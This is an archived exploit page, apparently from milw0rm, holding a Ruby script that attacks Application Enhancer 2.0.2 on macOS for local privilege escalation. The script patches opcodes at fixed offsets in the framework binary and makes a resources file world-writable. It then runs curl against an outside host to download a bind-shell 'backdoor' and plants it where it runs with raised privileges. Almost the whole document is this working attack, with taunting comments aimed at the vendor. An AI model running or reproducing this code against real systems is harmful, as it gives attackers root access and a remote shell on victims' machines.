<html><head><title>Application Enhancer (APE) 2.0.2 Local Privilege Escalation Exploit</title></head><pre># !/usr/bin/ruby
# Exploit Of The Apes: A practical pwnage for Application (UN)Enhancer aka APU
# (c) 2006 LMH &lt;lmh [at] info-pull.com&gt; and Johnny Pwnerseed.
#
# This goes dedicated to #macdev. For the childish flaming and great brain lag.
#
# Lesson: Don't talk about stuff you have NFC about. And don't insult
# people. Once you do it, and get pwned, total lulz ensues ;o(
#
# MD5 (ApplicationEnhancer) = cf9bf1fa74f8298f09aedce38c72a7da
# at offset 27512   0x807d0014      -&gt;  0x38600000
# at offset 115586  0x8b4614890424  -&gt;  0x31c090890424
# 

require 'fileutils'

# Define offsets to opcodes to be patched
PATCH_INSTRUCTIONS =  [
                        [ 27512,  &quot;\x38\x60\x00\x00&quot;         ],
                        [ 115586, &quot;\x31\xc0\x90\x89\x04\x24&quot; ]
                      ]

BACKDOO_URL = &quot;http://projects.info-pull.com/moab/bug-files/sample-back&quot; # must be fat binary, sample bind shell
PATH_TO_APE = &quot;/Library/Frameworks/ApplicationEnhancer.framework&quot;
PATH_TO_APU = &quot;/Library/Frameworks/ApplicationUnenhancer.framework&quot;

path_to_bozo  = (ARGV[0] || File.join(PATH_TO_APE,&quot;Versions/Current/ApplicationEnhancer&quot;))

puts &quot;++ Starting: #{PATH_TO_APE}&quot;
puts &quot;++ Back-up:  #{PATH_TO_APU}&quot;
# Move the original framework to back-up, copy contents back, set permissions.
# To repair:
# rm -rf /Library/Frameworks/ApplicationEnhancer.framework
# mv /Library/Frameworks/ApplicationUnenhancer.framework \
# /Library/Frameworks/ApplicationEnhancer.framework
if File.exists?(PATH_TO_APE)
  unless File.exists?(PATH_TO_APU)
    FileUtils.mv(PATH_TO_APE, PATH_TO_APU)
    FileUtils.cp_r(PATH_TO_APU, PATH_TO_APE)
    system &quot;chmod u+w #{File.join(PATH_TO_APE, &quot;Versions/A/ApplicationEnhancer&quot;)}&quot;
  end
end

# Patching poor Apu (we could just replace the binary, but this is cooler as the
# guys at Unsanity, LLC think they can dropriv and forget all about flawed code...).
bozo    = File.read(path_to_bozo)

puts &quot;++ Patch: #{path_to_bozo}&quot;
PATCH_INSTRUCTIONS.each do |patch|
  offset  = patch[0] # start offset
  bindata = patch[1] # patch bytes
  bcount  = 0

  puts &quot;++ Patching stage: offset=#{offset} patch size=#{bindata.size}&quot;
  bindata.split(//).each do |patch_byte|
    target_offset = offset + bcount
    printf &quot;++ Patching byte at %x\n&quot;, target_offset
    bozo[target_offset] = patch_byte
    bcount += 1
  end
end

puts &quot;++ Binary pwnage done. Writing patched data...&quot;
u_bozo = File.new(File.join(PATH_TO_APE, &quot;/Versions/A/ApplicationEnhancer&quot;), &quot;w&quot;)
u_bozo.write(bozo)
u_bozo.close
puts &quot;++ Done (#{bozo.size} bytes). Planting backdoor aped binary...&quot;

aped_path = File.join(PATH_TO_APE, &quot;Resources/aped&quot;)
system &quot;chmod a+rxw #{aped_path}&quot; # let everyone backdoor it afterwards, be social and share!
system &quot;curl #{BACKDOO_URL} -o #{aped_path}&quot;
system &quot;chmod a+x #{aped_path}&quot;

puts &quot;++ Finished.&quot;

# milw0rm.com [2007-01-08]</pre></html>